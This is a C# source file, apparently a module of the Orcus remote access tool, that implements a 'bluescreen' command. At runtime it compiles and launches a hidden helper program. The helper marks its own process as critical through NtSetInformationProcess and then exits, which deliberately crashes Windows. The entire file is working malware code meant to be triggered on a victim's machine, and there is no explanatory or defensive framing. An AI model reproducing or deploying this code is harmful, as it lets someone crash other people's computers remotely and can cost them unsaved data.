using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Microsoft.CSharp;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.FunActions
{
    public static class BluescreenTool
    {
        private const string Source = @"using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BlueScreenTrigger
{
    internal static class Program
    {
        [DllImport(""ntdll.dll"", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
            ref int processInformation, int processInformationLength);
        [STAThread]
        private static void Main()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            Environment.Exit(0);
        }
    }
}";
        public static void Trigger()
        {
            var providerOptions = new Dictionary<string, string>
            {
                {"CompilerVersion", "v3.5"}
            };

            var provider = new CSharpCodeProvider(providerOptions);
            var executable = FileExtensions.GetFreeTempFileName("exe");
            var compilerParams = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = executable
            };
            compilerParams.ReferencedAssemblies.Add("System.dll");
            compilerParams.ReferencedAssemblies.Add("System.Core.dll");
            var results = provider.CompileAssemblyFromSource(compilerParams, Source);
            if (results.Errors.HasErrors)
                throw new InvalidOperationException("Invalid code");
            File.WriteAllText(results.PathToAssembly + ".config", Properties.Resources.AppConfig);
            Process.Start(results.PathToAssembly);
        }
    }
}